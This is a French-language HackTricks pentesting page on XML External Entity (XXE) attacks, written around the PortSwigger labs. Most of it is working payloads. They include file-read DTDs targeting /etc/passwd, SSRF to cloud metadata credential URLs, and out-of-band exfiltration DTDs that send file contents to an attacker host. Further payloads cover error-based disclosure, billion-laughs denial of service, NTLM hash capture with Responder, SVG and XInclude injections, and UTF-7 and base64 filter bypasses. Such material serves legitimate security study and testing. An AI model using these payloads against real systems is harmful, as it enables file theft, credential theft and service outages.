# XXE - XEE - XML External Entity

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bases de XML

XML est un langage de balisage con√ßu pour le stockage et le transport de donn√©es, offrant une structure flexible qui permet l'utilisation de balises nomm√©es de mani√®re descriptive. Il diff√®re de HTML en n'√©tant pas limit√© √† un ensemble de balises pr√©d√©finies. La signification de XML a diminu√© avec l'essor de JSON, malgr√© son r√¥le initial dans la technologie AJAX.

* **Repr√©sentation des donn√©es √† travers les entit√©s** : Les entit√©s en XML permettent la repr√©sentation des donn√©es, y compris les caract√®res sp√©ciaux comme `&lt;` et `&gt;`, qui correspondent √† `<` et `>` pour √©viter les conflits avec le syst√®me de balisage XML.
* **D√©finition des √©l√©ments XML** : XML permet la d√©finition des types d'√©l√©ments, d√©crivant comment les √©l√©ments doivent √™tre structur√©s et quel contenu ils peuvent contenir, allant de tout type de contenu √† des √©l√©ments enfants sp√©cifiques.
* **D√©finition de type de document (DTD)** : Les DTD sont cruciales en XML pour d√©finir la structure du document et les types de donn√©es qu'il peut contenir. Elles peuvent √™tre internes, externes ou une combinaison des deux, guidant la fa√ßon dont les documents sont format√©s et valid√©s.
* **Entit√©s personnalis√©es et externes** : XML prend en charge la cr√©ation d'entit√©s personnalis√©es dans une DTD pour une repr√©sentation flexible des donn√©es. Les entit√©s externes, d√©finies avec une URL, soul√®vent des pr√©occupations de s√©curit√©, en particulier dans le contexte des attaques par entit√© externe XML (XXE), qui exploitent la mani√®re dont les analyseurs XML g√®rent les sources de donn√©es externes : `<!DOCTYPE foo [ <!ENTITY myentity "valeur" > ]>`
* **D√©tection de XXE avec des entit√©s de param√®tres** : Pour d√©tecter les vuln√©rabilit√©s XXE, en particulier lorsque les m√©thodes conventionnelles √©chouent en raison des mesures de s√©curit√© de l'analyseur, les entit√©s de param√®tres XML peuvent √™tre utilis√©es. Ces entit√©s permettent des techniques de d√©tection hors bande, telles que le d√©clenchement de recherches DNS ou de requ√™tes HTTP vers un domaine contr√¥l√©, pour confirmer la vuln√©rabilit√©.
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///etc/passwd" > ]>`
* `<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://attacker.com" > ]>`

## Attaques principales

[**La plupart de ces attaques ont √©t√© test√©es en utilisant les excellents laboratoires XEE de Portswiggers : https://portswigger.net/web-security/xxe**](https://portswigger.net/web-security/xxe)

### Nouveau test d'entit√©

Dans cette attaque, je vais tester si une simple nouvelle d√©claration d'ENTIT√â fonctionne
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
### Lire le fichier

Essayons de lire `/etc/passwd` de diff√©rentes mani√®res. Pour Windows, vous pourriez essayer de lire : `C:\windows\system32\drivers\etc\hosts`

Dans ce premier cas, notez que SYSTEM "_\*\*file:///\*\*etc/passwd_" fonctionnera √©galement.
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
![](<../.gitbook/assets/image (83).png>)

Ce deuxi√®me cas devrait √™tre utile pour extraire un fichier si le serveur web utilise PHP (Pas le cas des laboratoires Portswiggers)
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
Dans ce troisi√®me cas, remarquez que nous d√©clarons l'`√âl√©ment stockCheck` comme ANY
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
![](<../.gitbook/assets/image (750).png>)

### Listing de r√©pertoire

Dans les applications bas√©es sur **Java**, il pourrait √™tre possible de **list the contents of a directory** via XXE with a payload like (just asking for the directory instead of the file):
```xml
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE pourrait √™tre utilis√© pour abuser d'un SSRF √† l'int√©rieur d'un cloud
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF Aveugle

En utilisant la **technique pr√©c√©demment comment√©e**, vous pouvez amener le serveur √† acc√©der √† un serveur que vous contr√¥lez pour montrer sa vuln√©rabilit√©. Mais, si cela ne fonctionne pas, c'est peut-√™tre parce que les **entit√©s XML ne sont pas autoris√©es**, dans ce cas, vous pourriez essayer d'utiliser des **entit√©s de param√®tres XML**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### SSRF "Aveugle" - Exfiltrer des donn√©es hors bande

**Dans ce cas, nous allons faire charger au serveur un nouveau DTD avec une charge utile malveillante qui enverra le contenu d'un fichier via une requ√™te HTTP (**pour **les fichiers multi-lignes, vous pourriez essayer de l'exfiltrer via** _**ftp://**_ en utilisant ce serveur de base par exemple [**xxe-ftp-server.rb**](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb)**). Cette explication est bas√©e sur** [**le laboratoire de Portswigger ici**](https://portswigger.net/web-security/xxe/blind)**.**

Dans le DTD malveillant donn√©, une s√©rie d'√©tapes sont effectu√©es pour exfiltrer des donn√©es :

### Exemple de DTD Malveillant :

La structure est la suivante :
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Les √©tapes ex√©cut√©es par cette DTD incluent:

1. **D√©finition des entit√©s de param√®tres:**
* Une entit√© de param√®tre XML, `%file`, est cr√©√©e, lisant le contenu du fichier `/etc/hostname`.
* Une autre entit√© de param√®tre XML, `%eval`, est d√©finie. Elle d√©clare dynamiquement une nouvelle entit√© de param√®tre XML, `%exfiltrate`. L'entit√© `%exfiltrate` est configur√©e pour effectuer une requ√™te HTTP vers le serveur de l'attaquant, transmettant le contenu de l'entit√© `%file` dans la cha√Æne de requ√™te de l'URL.
2. **Ex√©cution des entit√©s:**
* L'entit√© `%eval` est utilis√©e, entra√Ænant l'ex√©cution de la d√©claration dynamique de l'entit√© `%exfiltrate`.
* L'entit√© `%exfiltrate` est ensuite utilis√©e, d√©clenchant une requ√™te HTTP vers l'URL sp√©cifi√© avec le contenu du fichier.

L'attaquant h√©berge cette DTD malveillante sur un serveur sous leur contr√¥le, g√©n√©ralement √† une URL comme `http://web-attacker.com/malicious.dtd`.

**Charge utile XXE:** Pour exploiter une application vuln√©rable, l'attaquant envoie une charge utile XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Ce payload d√©finit une entit√© de param√®tre XML `%xxe` et l'incorpore dans le DTD. Lorsqu'il est trait√© par un analyseur XML, ce payload r√©cup√®re le DTD externe √† partir du serveur de l'attaquant. L'analyseur interpr√®te ensuite le DTD en ligne, ex√©cutant les √©tapes d√©crites dans le DTD malveillant et conduisant √† l'exfiltration du fichier `/etc/hostname` vers le serveur de l'attaquant.

### Bas√© sur les erreurs (DTD externe)

**Dans ce cas, nous allons faire en sorte que le serveur charge un DTD malveillant qui affichera le contenu d'un fichier √† l'int√©rieur d'un message d'erreur (ceci est uniquement valable si vous pouvez voir les messages d'erreur).** [**Exemple ici.**](https://portswigger.net/web-security/xxe/blind)

Un message d'erreur d'analyse XML, r√©v√©lant le contenu du fichier `/etc/passwd`, peut √™tre d√©clench√© en utilisant une D√©finition de Type de Document externe (DTD) malveillante. Cela est accompli √† travers les √©tapes suivantes :

1. Une entit√© de param√®tre XML nomm√©e `file` est d√©finie, qui contient le contenu du fichier `/etc/passwd`.
2. Une entit√© de param√®tre XML nomm√©e `eval` est d√©finie, incorporant une d√©claration dynamique pour une autre entit√© de param√®tre XML nomm√©e `error`. Cette entit√© `error`, lorsqu'elle est √©valu√©e, tente de charger un fichier inexistant, incorporant le contenu de l'entit√© `file` comme son nom.
3. L'entit√© `eval` est invoqu√©e, conduisant √† la d√©claration dynamique de l'entit√© `error`.
4. L'invocation de l'entit√© `error` entra√Æne une tentative de chargement d'un fichier inexistant, produisant un message d'erreur qui inclut le contenu du fichier `/etc/passwd` en tant que partie du nom de fichier.

Le DTD externe malveillant peut √™tre invoqu√© avec le XML suivant :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
√Ä l'ex√©cution, la r√©ponse du serveur web devrait inclure un message d'erreur affichant le contenu du fichier `/etc/passwd`.

![](<../.gitbook/assets/image (806).png>)

_**Veuillez noter que le DTD externe nous permet d'inclure une entit√© √† l'int√©rieur de la seconde (****`eval`****), mais c'est interdit dans le DTD interne. Par cons√©quent, vous ne pouvez pas forcer une erreur sans utiliser un DTD externe (g√©n√©ralement).**_

### **Bas√© sur les erreurs (DTD syst√®me)**

Alors, que se passe-t-il avec les vuln√©rabilit√©s XXE aveugles lorsque les **interactions hors bande sont bloqu√©es** (les connexions externes ne sont pas disponibles)?.

Une faille dans la sp√©cification du langage XML peut **exposer des donn√©es sensibles √† travers des messages d'erreur lorsque le DTD d'un document m√©lange des d√©clarations internes et externes**. Ce probl√®me permet la red√©finition interne des entit√©s d√©clar√©es de mani√®re externe, facilitant l'ex√©cution d'attaques XXE bas√©es sur les erreurs. De telles attaques exploitent la red√©finition d'une entit√© de param√®tre XML, initialement d√©clar√©e dans un DTD externe, √† partir d'un DTD interne. Lorsque les connexions hors bande sont bloqu√©es par le serveur, les attaquants doivent se fier aux fichiers DTD locaux pour mener l'attaque, visant √† induire une erreur d'analyse pour r√©v√©ler des informations sensibles.

Consid√©rons un sc√©nario o√π le syst√®me de fichiers du serveur contient un fichier DTD √† `/usr/local/app/schema.dtd`, d√©finissant une entit√© nomm√©e `custom_entity`. Un attaquant peut induire une erreur d'analyse XML r√©v√©lant le contenu du fichier `/etc/passwd` en soumettant un DTD hybride comme suit:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Les √©tapes d√©crites sont ex√©cut√©es par cette DTD :

* La d√©finition d'une entit√© de param√®tre XML nomm√©e `local_dtd` inclut le fichier DTD externe situ√© sur le syst√®me de fichiers du serveur.
* Une red√©finition se produit pour l'entit√© de param√®tre XML `custom_entity`, initialement d√©finie dans le DTD externe, pour encapsuler une [exploitation XXE bas√©e sur les erreurs](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Cette red√©finition est con√ßue pour provoquer une erreur d'analyse, exposant le contenu du fichier `/etc/passwd`.
* En utilisant l'entit√© `local_dtd`, le DTD externe est engag√©, englobant la `custom_entity` nouvellement d√©finie. Cette s√©quence d'actions provoque l'√©mission du message d'erreur vis√© par l'exploit.

**Exemple du monde r√©el :** Les syst√®mes utilisant l'environnement de bureau GNOME ont souvent un DTD √† `/usr/share/yelp/dtd/docbookx.dtd` contenant une entit√© appel√©e `ISOamso`.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (622).png>)

Comme cette technique utilise un **DTD interne, vous devez d'abord en trouver un valide**. Vous pourriez le faire en **installant** le m√™me **OS / logiciel** que celui utilis√© par le serveur et en **recherchant quelques DTD par d√©faut**, ou en **r√©cup√©rant une liste** de **DTD par d√©faut** √† l'int√©rieur des syst√®mes et en **v√©rifiant** s'il en existe un :
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Pour plus d'informations, consultez [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Recherche de DTD √† l'int√©rieur du syst√®me

Dans le d√©p√¥t github impressionnant suivant, vous pouvez trouver **les chemins des DTD qui peuvent √™tre pr√©sents dans le syst√®me**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

De plus, si vous avez **l'image Docker du syst√®me victime**, vous pouvez utiliser l'outil du m√™me d√©p√¥t pour **analyser** l'**image** et **trouver** le chemin des **DTD** pr√©sents dans le syst√®me. Lisez le [Readme du github](https://github.com/GoSecure/dtd-finder) pour apprendre comment faire.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE via Office Open XML Parsers

Pour une explication plus approfondie de cette attaque, **consultez la deuxi√®me section de** [**cet article incroyable**](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) **de Detectify**.

La capacit√© de **charger des documents Microsoft Office est propos√©e par de nombreuses applications web**, qui proc√®dent ensuite √† l'extraction de certaines informations de ces documents. Par exemple, une application web peut permettre aux utilisateurs d'importer des donn√©es en t√©l√©chargeant une feuille de calcul au format XLSX. Afin que l'analyseur puisse extraire les donn√©es de la feuille de calcul, il devra in√©vitablement analyser au moins un fichier XML.

Pour tester cette vuln√©rabilit√©, il est n√©cessaire de cr√©er un **fichier Microsoft Office contenant une charge utile XXE**. La premi√®re √©tape consiste √† cr√©er un r√©pertoire vide dans lequel le document peut √™tre d√©compress√©.

Une fois le document d√©compress√©, le fichier XML situ√© √† `./unzipped/word/document.xml` doit √™tre ouvert et modifi√© dans un √©diteur de texte pr√©f√©r√© (tel que vim). Le XML doit √™tre modifi√© pour inclure la charge utile XXE souhait√©e, commen√ßant souvent par une requ√™te HTTP.

Les lignes XML modifi√©es doivent √™tre ins√©r√©es entre les deux objets XML racine. Il est important de remplacer l'URL par une URL pouvant √™tre surveill√©e pour les requ√™tes.

Enfin, le fichier peut √™tre compress√© pour cr√©er le fichier malveillant poc.docx. √Ä partir du r√©pertoire "unzipped" pr√©c√©demment cr√©√©, la commande suivante doit √™tre ex√©cut√©e :

Maintenant, le fichier cr√©√© peut √™tre t√©l√©charg√© vers l'application web potentiellement vuln√©rable, et on peut esp√©rer qu'une requ√™te apparaisse dans les journaux de Burp Collaborator.

### Jar: protocol

Le protocole **jar** est accessible exclusivement dans les **applications Java**. Il est con√ßu pour permettre l'acc√®s aux fichiers dans une archive **PKZIP** (par exemple, `.zip`, `.jar`, etc.), prenant en charge √† la fois les fichiers locaux et distants.
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Pour pouvoir acc√©der aux fichiers √† l'int√©rieur des fichiers PKZIP est **tr√®s utile pour abuser des XXE via les fichiers DTD syst√®me.** Consultez [cette section pour apprendre comment abuser des fichiers DTD syst√®me](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

Le processus permettant d'acc√©der √† un fichier dans une archive PKZIP via le protocole jar implique plusieurs √©tapes :

1. Une requ√™te HTTP est effectu√©e pour t√©l√©charger l'archive zip √† partir d'un emplacement sp√©cifi√©, tel que `https://download.website.com/archive.zip`.
2. La r√©ponse HTTP contenant l'archive est temporairement stock√©e sur le syst√®me, g√©n√©ralement dans un emplacement tel que `/tmp/...`.
3. L'archive est ensuite extraite pour acc√©der √† son contenu.
4. Le fichier sp√©cifique dans l'archive, `file.zip`, est lu.
5. Apr√®s l'op√©ration, tous les fichiers temporaires cr√©√©s pendant ce processus sont supprim√©s.

Une technique int√©ressante pour interrompre ce processus √† la deuxi√®me √©tape consiste √† maintenir la connexion serveur ouverte ind√©finiment lors de la fourniture du fichier d'archive. Les outils disponibles dans [ce d√©p√¥t](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution) peuvent √™tre utilis√©s √† cette fin, y compris un serveur Python (`slow_http_server.py`) et un serveur Java (`slowserver.jar`).
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "jar:http://attacker.com:8080/evil.zip!/evil.dtd">]>
<foo>&xxe;</foo>
```
{% hint style="danger" %}
√âcrire des fichiers dans un r√©pertoire temporaire peut aider √† **aggraver une autre vuln√©rabilit√© qui implique une travers√©e de chemin** (comme l'inclusion de fichier local, l'injection de mod√®le, XSLT RCE, d√©s√©rialisation, etc).
{% endhint %}

### XSS
```xml
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Attaque des milliards de rires
```xml
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Attaque Yaml
```xml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Attaque d'Explosion Quadratique

![](<../.gitbook/assets/image (524).png>)

#### Obtenir NTML

Sur les h√¥tes Windows, il est possible d'obtenir le hachage NTML de l'utilisateur du serveur web en configurant un gestionnaire responder.py:
```bash
Responder.py -I eth0 -v
```
et en envoyant la requ√™te suivante
```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Surfaces XXE Cach√©es

### XInclude

Lors de l'int√©gration de donn√©es client dans des documents XML c√¥t√© serveur, comme ceux des requ√™tes SOAP en backend, le contr√¥le direct sur la structure XML est souvent limit√©, entravant les attaques XXE traditionnelles en raison des restrictions sur la modification de l'√©l√©ment `DOCTYPE`. Cependant, une attaque `XInclude` fournit une solution en permettant l'insertion d'entit√©s externes dans n'importe quel √©l√©ment de donn√©es du document XML. Cette m√©thode est efficace m√™me lorsque seule une partie des donn√©es √† l'int√©rieur d'un document XML g√©n√©r√© par le serveur peut √™tre contr√¥l√©e.

Pour ex√©cuter une attaque `XInclude`, l'espace de noms `XInclude` doit √™tre d√©clar√©, et le chemin du fichier pour l'entit√© externe pr√©vue doit √™tre sp√©cifi√©. Voici un exemple succinct de la fa√ßon dont une telle attaque peut √™tre formul√©e:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Consultez [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) pour plus d'informations !

### SVG - T√©l√©chargement de fichiers

Les fichiers t√©l√©charg√©s par les utilisateurs vers certaines applications, qui sont ensuite trait√©s sur le serveur, peuvent exploiter des vuln√©rabilit√©s dans la mani√®re dont les formats de fichiers XML ou contenant du XML sont g√©r√©s. Des formats de fichiers courants tels que les documents de bureau (DOCX) et les images (SVG) sont bas√©s sur XML.

Lorsque les utilisateurs **t√©l√©chargent des images**, ces images sont trait√©es ou valid√©es c√¥t√© serveur. M√™me pour les applications qui s'attendent √† des formats tels que PNG ou JPEG, **la biblioth√®que de traitement d'images du serveur pourrait √©galement prendre en charge les images SVG**. SVG, √©tant un format bas√© sur XML, peut √™tre exploit√© par des attaquants pour soumettre des images SVG malveillantes, exposant ainsi le serveur √† des vuln√©rabilit√©s XXE (XML External Entity).

Un exemple d'une telle exploitation est pr√©sent√© ci-dessous, o√π une image SVG malveillante tente de lire des fichiers syst√®me :
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Une autre m√©thode consiste √† tenter d'**ex√©cuter des commandes** √† travers l'enveloppe PHP "expect" :
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
Dans les deux cas, le format SVG est utilis√© pour lancer des attaques exploitant les capacit√©s de traitement XML du logiciel du serveur, soulignant ainsi la n√©cessit√© d'une validation d'entr√©e robuste et de mesures de s√©curit√©.

Consultez [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) pour plus d'informations !

**Notez que la premi√®re ligne du fichier lu ou du r√©sultat de l'ex√©cution appara√Ætra √Ä L'INT√âRIEUR de l'image cr√©√©e. Vous devez donc pouvoir acc√©der √† l'image cr√©√©e par SVG.**

### **PDF - T√©l√©chargement de fichiers**

Consultez le post suivant pour **apprendre comment exploiter une XXE en t√©l√©chargeant un fichier PDF** :

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded √† XML

Si une requ√™te POST accepte les donn√©es au format XML, vous pourriez essayer d'exploiter une XXE dans cette requ√™te. Par exemple, si une requ√™te normale contient ce qui suit :
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Ensuite, vous pourrez soumettre la demande suivante, avec le m√™me r√©sultat :
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON √† XEE

Pour modifier la requ√™te, vous pourriez utiliser une extension Burp nomm√©e "**Content Type Converter**". [Ici](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) vous pouvez trouver cet exemple:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Un autre exemple peut √™tre trouv√© [ici](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Contournements de WAF & Protections

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Cela ne fonctionne que si le serveur XML accepte le protocole `data://`.

### UTF-7

Vous pouvez utiliser la \[**"Recette d'encodage**" de cyberchef ici ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)to]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29to)) pour transformer en UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Fichier:/ Contournement du protocole

Si le site web utilise PHP, au lieu d'utiliser `file:/`, vous pouvez utiliser les **enveloppes php** `php://filter/convert.base64-encode/resource=` pour **acc√©der aux fichiers internes**.

Si le site web utilise Java, vous pouvez v√©rifier le [**protocole jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entit√©s HTML

Astuce de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Vous pouvez cr√©er une **entit√© √† l'int√©rieur d'une entit√©** en l'encodant avec des **entit√©s html** puis l'appeler pour **charger un dtd**.\
Notez que les **Entit√©s HTML** utilis√©es doivent √™tre **num√©riques** (comme \[dans cet exemple]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
